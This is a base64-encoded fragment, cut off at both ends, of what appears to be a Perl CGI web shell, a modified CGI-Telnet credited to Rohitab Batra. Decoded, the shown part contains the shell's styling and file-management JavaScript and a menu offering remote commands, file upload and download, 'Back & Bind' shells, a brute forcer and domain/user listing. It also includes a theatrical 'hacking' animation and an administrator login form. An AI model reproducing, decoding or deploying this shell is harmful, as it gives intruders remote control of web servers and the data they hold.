VkIDBweCAjMzMzOw0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpmb250OiAxMHB0IFZlcmRhbmEgYm9sZDsNCmNvbG9yOiB3aGlsZTsNCn0NCg0KcnVuIHsNCmJvcmRlcgkJCTogZGFzaGVkIDBweCAjMzMzOw0KZm9udDogMTBwdCBWZXJkYW5hIGJvbGQ7DQpjb2xvcjogI0ZGMDBBQTsNCn0NCg0KdGV4dGFyZWEgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpCQUNLR1JPVU5ELUNPTE9SOiAjMWIxYjFiOw0KZm9udDogRml4ZWRzeXMgYm9sZDsNCmNvbG9yOiAjYWFhOw0KfQ0KQTpsaW5rIHsNCglDT0xPUjogIzJCQThFQzsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOnZpc2l0ZWQgew0KCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6aG92ZXIgew0KCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsNCgljb2xvcjogI2ZmOTkwMDsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmFjdGl2ZSB7DQoJY29sb3I6IFJlZDsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQoNCi5saXN0ZGlyIHRyOmhvdmVyew0KCWJhY2tncm91bmQ6ICM0NDQ7DQp9DQoubGlzdGRpciB0cjpob3ZlciB0ZHsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsNCgljb2xvcjogI0ZGRkZGRjsgVEVYVC1ERUNPUkFUSU9OOiBub25lOw0KfQ0KLm5vdGxpbmV7DQoJYmFja2dyb3VuZDogIzExMTsNCn0NCi5saW5lew0KCWJhY2tncm91bmQ6ICMyMjI7DQp9DQo8L3N0eWxlPg0KPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+DQpmdW5jdGlvbiBjaG1vZF9mb3JtKGksZmlsZSkNCnsNCgkvKnZhciBhamF4PSdhamF4X1Bvc3REYXRhKCJGb3JtUGVybXNfJytpKyciLCIkU2NyaXB0TG9jYXRpb24iLCJSZXNwb25zZURhdGEiKTsgcmV0dXJuIGZhbHNlOyc7Ki8NCgl2YXIgYWpheD0iIjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1jaG1vZCB0eXBlPXRleHQgc2l6ZT01IC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBhamF4ICsgIicgdmFsdWU9T0s+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckZGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9jaG1vZF9mb3JtKHJlc3BvbnNlLGkscGVybXMsZmlsZSkNCnsNCglyZXNwb25zZS5pbm5lckhUTUwgPSAiPHNwYW4gb25jbGljaz1cXFwiY2htb2RfZm9ybSgiICsgaSArICIsJyIrIGZpbGUrICInKVxcXCIgPiIrIHBlcm1zICsiPC9zcGFuPjwvdGQ+IjsNCn0NCmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQ0Kew0KCXZhciBhamF4PSIiOw0KCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOw0KCXZhciBiYWNrPSJybV9yZW5hbWVfZm9ybSgiK2krIixcXFwiIitmaWxlKyJcXFwiLFxcXCIiK2YrIlxcXCIpOyByZXR1cm4gZmFsc2U7IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9cmVuYW1lIHR5cGU9dGV4dCB2YWx1ZT0gJyIrZmlsZSsiJyAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYmFjayArICInIHZhbHVlPUNhbmNlbD48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRkaXInPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWYgdmFsdWU9JyIrZmlsZSsiJz48L2Zvcm0+IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsNCn0NCmZ1bmN0aW9uIHJtX3JlbmFtZV9mb3JtKGksZmlsZSxmKQ0Kew0KCWlmKGY9PSdmJykNCgl7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1jb21tYW5kJmQ9JGRpciZjPWVkaXQlMjAiK2ZpbGUrIiUyMCc+IiArZmlsZSsgIjwvYT4iOw0KCX1lbHNlDQoJew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Z3VpJmQ9IitmKyInPlsgIiArZmlsZSsgIiBdPC9hPiI7DQoJfQ0KfQ0KPC9zY3JpcHQ+DQo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzBjMGMwYyIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjxjZW50ZXI+PGNvZGU+DQo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4NCjx0cj4NCgk8dGQgYWxpZ249ImNlbnRlciIgcm93c3Bhbj0yPg0KCQk8Yj48Zm9udCBzaXplPSI1Ij4kRWRpdFBlcnNpb248L2ZvbnQ+PC9iPg0KCTwvdGQ+DQoNCgk8dGQ+DQoNCgkJPGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+JEVOVnsiU0VSVkVSX1NPRlRXQVJFIn08L2ZvbnQ+DQoJPC90ZD4NCgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSIjYmIwMDAwIj4gJEVOVnsnU0VSVkVSX0FERFInfTwvZm9udD4gfCBZb3VyIElQOiA8Zm9udCBjb2xvcj0iI2JiMDAwMCI+JEVOVnsnUkVNT1RFX0FERFInfTwvZm9udD4NCgk8L3RkPg0KDQo8L3RyPg0KDQo8dHI+DQo8dGQgY29sc3Bhbj0iMyI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24iPkhvbWU8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jb21tYW5kJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5Db21tYW5kPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1ndWkmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkdVSTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+VXBsb2FkIEZpbGU8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+RG93bmxvYWQgRmlsZTwvYT4gfA0KDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1iYWNrYmluZCI+QmFjayAmIEJpbmQ8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJydXRlZm9yY2VyIj5CcnV0ZSBGb3JjZXI8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNoZWNrbG9nIj5DaGVjayBMb2c8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvbWFpbnN1c2VyIj5Eb21haW5zL1VzZXJzPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1sb2dvdXQiPkxvZ291dDwvYT4gfA0KPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9IiMiPkhlbHA8L2E+DQoNCjwvZm9udD48L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8Zm9udCBpZD0iUmVzcG9uc2VEYXRhIiBjb2xvcj0iI2ZmOTljYyIgPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBMb2dpbiBTY3JlZW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luU2NyZWVuDQp7DQoNCglwcmludCA8PEVORDsNCjxwcmU+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KVHlwaW5nVGV4dCA9IGZ1bmN0aW9uKGVsZW1lbnQsIGludGVydmFsLCBjdXJzb3IsIGZpbmlzaGVkQ2FsbGJhY2spIHsNCiAgaWYoKHR5cGVvZiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCA9PSAidW5kZWZpbmVkIikgfHwgKHR5cGVvZiBlbGVtZW50LmlubmVySFRNTCA9PSAidW5kZWZpbmVkIikpIHsNCiAgICB0aGlzLnJ1bm5pbmcgPSB0cnVlOwkvLyBOZXZlciBydW4uDQogICAgcmV0dXJuOw0KICB9DQogIHRoaXMuZWxlbWVudCA9IGVsZW1lbnQ7DQogIHRoaXMuZmluaXNoZWRDYWxsYmFjayA9IChmaW5pc2hlZENhbGxiYWNrID8gZmluaXNoZWRDYWxsYmFjayA6IGZ1bmN0aW9uKCkgeyByZXR1cm47IH0pOw0KICB0aGlzLmludGVydmFsID0gKHR5cGVvZiBpbnRlcnZhbCA9PSAidW5kZWZpbmVkIiA/IDEwMCA6IGludGVydmFsKTsNCiAgdGhpcy5vcmlnVGV4dCA9IHRoaXMuZWxlbWVudC5pbm5lckhUTUw7DQogIHRoaXMudW5wYXJzZWRPcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQ7DQogIHRoaXMuY3Vyc29yID0gKGN1cnNvciA/IGN1cnNvciA6ICIiKTsNCiAgdGhpcy5jdXJyZW50VGV4dCA9ICIiOw0KICB0aGlzLmN1cnJlbnRDaGFyID0gMDsNCiAgdGhpcy5lbGVtZW50LnR5cGluZ1RleHQgPSB0aGlzOw0KICBpZih0aGlzLmVsZW1lbnQuaWQgPT0gIiIpIHRoaXMuZWxlbWVudC5pZCA9ICJ0eXBpbmd0ZXh0IiArIFR5cGluZ1RleHQuY3VycmVudEluZGV4Kys7DQogIFR5cGluZ1RleHQuYWxsLnB1c2godGhpcyk7DQogIHRoaXMucnVubmluZyA9IGZhbHNlOw0KICB0aGlzLmluVGFnID0gZmFsc2U7DQogIHRoaXMudGFnQnVmZmVyID0gIiI7DQogIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7DQogIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICIiOw0KfQ0KVHlwaW5nVGV4dC5hbGwgPSBuZXcgQXJyYXkoKTsNClR5cGluZ1RleHQuY3VycmVudEluZGV4ID0gMDsNClR5cGluZ1RleHQucnVuQWxsID0gZnVuY3Rpb24oKSB7DQogIGZvcih2YXIgaSA9IDA7IGkgPCBUeXBpbmdUZXh0LmFsbC5sZW5ndGg7IGkrKykgVHlwaW5nVGV4dC5hbGxbaV0ucnVuKCk7DQp9DQpUeXBpbmdUZXh0LnByb3RvdHlwZS5ydW4gPSBmdW5jdGlvbigpIHsNCiAgaWYodGhpcy5ydW5uaW5nKSByZXR1cm47DQogIGlmKHR5cGVvZiB0aGlzLm9yaWdUZXh0ID09ICJ1bmRlZmluZWQiKSB7DQogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOwkvLyBXZSBoYXZlbid0IGZpbmlzaGVkIGxvYWRpbmcgeWV0LiAgSGF2ZSBwYXRpZW5jZS4NCiAgICByZXR1cm47DQogIH0NCiAgaWYodGhpcy5jdXJyZW50VGV4dCA9PSAiIikgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9ICIiOw0KLy8gIHRoaXMub3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0LnJlcGxhY2UoLzwoW148XSkqPi8sICIiKTsgICAgIC8vIFN0cmlwIEhUTUwgZnJvbSB0ZXh0Lg0KICBpZih0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGgpIHsNCiAgICBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPCIgJiYgIXRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyID0gIjwiOw0KICAgICAgdGhpcy5pblRhZyA9IHRydWU7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPiIgJiYgdGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgKz0gIj4iOw0KICAgICAgdGhpcy5pblRhZyA9IGZhbHNlOw0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLnRhZ0J1ZmZlcjsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIiYiICYmICF0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiYiOw0KICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSB0cnVlOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjsiICYmIHRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gIjsiOw0KICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5IVE1MRW50aXR5QnVmZmVyOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIHsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgfQ0KICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSB0aGlzLmN1cnJlbnRUZXh0Ow0KICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgKz0gKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCAtIDEgPyAodHlwZW9mIHRoaXMuY3Vyc29yID09ICJmdW5jdGlvbiIgPyB0aGlzLmN1cnNvcih0aGlzLmN1cnJlbnRUZXh0KSA6IHRoaXMuY3Vyc29yKSA6ICIiKTsNCiAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOw0KICB9IGVsc2Ugew0KCXRoaXMuY3VycmVudFRleHQgPSAiIjsNCgl0aGlzLmN1cnJlbnRDaGFyID0gMDsNCiAgICAgICAgdGhpcy5ydW5uaW5nID0gZmFsc2U7DQogICAgICAgIHRoaXMuZmluaXNoZWRDYWxsYmFjaygpOw0KICB9DQp9DQo8L3NjcmlwdD4NCjwvcHJlPg0KDQo8Zm9udCBzdHlsZT0iZm9udDogMTVwdCBWZXJkYW5hOyBjb2xvcjogeWVsbG93OyI+Q29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEgPC9mb250Pjxicj48YnI+DQo8dGFibGUgYWxpZ249ImNlbnRlciIgYm9yZGVyPSIxIiB3aWR0aD0iNjAwIiBoZWlnaD4NCjx0Ym9keT48dHI+DQo8dGQgdmFsaWduPSJ0b3AiIGJhY2tncm91bmQ9Imh0dHA6Ly9kbC5kcm9wYm94LmNvbS91LzEwODYwMDUxL2ltYWdlcy9tYXRyYW4uZ2lmIj48cCBpZD0iaGFjayIgc3R5bGU9Im1hcmdpbi1sZWZ0OiAzcHg7Ij4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj4gUGxlYXNlIFdhaXQgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD4gPGJyPg0KDQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFRyeWluZyBjb25uZWN0IHRvIFNlcnZlciAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjRjAwMDAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+flwkPC9mb250PiBDb25uZWN0ZWQgISA8L2ZvbnQ+PGJyPg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+IENoZWNraW5nIFNlcnZlciAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+DQoNCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PC9mb250PiBUcnlpbmcgY29ubmVjdCB0byBDb21tYW5kIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD48YnI+DQoNCjxmb250IGNvbG9yPSIjRjAwMDAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PC9mb250PlwkIENvbm5lY3RlZCBDb21tYW5kISA8L2ZvbnQ+PGJyPg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48Zm9udCBjb2xvcj0iI0YwMDAwMCI+XCQ8L2ZvbnQ+PC9mb250PiBPSyEgWW91IGNhbiBraWxsIGl0ITwvZm9udD4NCjwvdHI+DQo8L3Rib2R5PjwvdGFibGU+DQo8YnI+DQoNCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCm5ldyBUeXBpbmdUZXh0KGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJoYWNrIiksIDMwLCBmdW5jdGlvbihpKXsgdmFyIGFyID0gbmV3IEFycmF5KCJfIiwiIik7IHJldHVybiAiICIgKyBhcltpLmxlbmd0aCAlIGFyLmxlbmd0aF07IH0pOw0KVHlwaW5nVGV4dC5ydW5BbGwoKTsNCg0KPC9zY3JpcHQ+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBBZGQgaHRtbCBzcGVjaWFsIGNoYXJzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsNCglteSAkdGV4dCA9IHNoaWZ0Ow0KCSR0ZXh0ID1+IHMvJi8mYW1wOy9nOw0KCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsNCgkkdGV4dCA9fiBzLycvJiMwMzk7L2c7DQoJJHRleHQgPX4gcy88LyZsdDsvZzsNCgkkdGV4dCA9fiBzLz4vJmd0Oy9nOw0KCXJldHVybiAkdGV4dDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQWRkIGxpbmsgZm9yIGRpcmVjdG9yeQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEFkZExpbmtEaXIoJCkNCnsNCglteSAkYWM9c2hpZnQ7DQoJbXkgQGRpcj0oKTsNCglpZigkV2luTlQpDQoJew0KCQlAZGlyPXNwbGl0KC9cXC8sJEN1cnJlbnREaXIpOw0KCX1lbHNlDQoJew0KCQlAZGlyPXNwbGl0KCIvIiwmdHJpbSgkQ3VycmVudERpcikpOw0KCX0NCglteSAkcGF0aD0iIjsNCglteSAkcmVzdWx0PSIiOw0KCWZvcmVhY2ggKEBkaXIpDQoJew0KCQkkcGF0aCAuPSAkXy4kUGF0aFNlcDsNCgkJJHJlc3VsdC49IjxhIGhyZWY9Jz9hPSIuJGFjLiImZD0iLiRwYXRoLiInPiIuJF8uJFBhdGhTZXAuIjwvYT4iOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5GYWlsZWRNZXNzYWdlDQp7DQoJcHJpbnQgPDxFTkQ7DQo8YnI+TG9naW4gOiBBZG1pbmlzdHJhdG9yPGJyPg0KDQpQYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KTG9naW4gOiBBZG1pbmlzdHJhdG9yPGJyPg0KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KCXByaW50ICI8YnI+PGZvbnQgY29sb3I9cmVkPm8tLS1bICA8Zm9udCBjb2xvcj0jZmY5OTAwPkVkaXQgYnkgJEVkaXRQZXJzaW9uIDwvZm9udD4gIF0tLS1vPC9mb250PjwvY29kZT48L2NlbnRlcj48L2JvZHk+PC9odG1sPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUNCiMgdmFyaWFibGUgJENvb2tpZXN7J30NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBHZXRDb29raWVzDQp7DQoJQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsNCglmb3JlYWNoICRjb29raWUoQGh0dHBjb29raWVzKQ0KCXsNCgkJKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOw0KCQkkQ29va2llc3skaWR9ID0gJHZhbDsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBzY3JlZW4gd2hlbiB0aGUgdXNlciBsb2dzIG91dA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9nb3V0U2NyZWVuDQp7DQoJcHJpbnQgIkNvbm5lY3Rpb2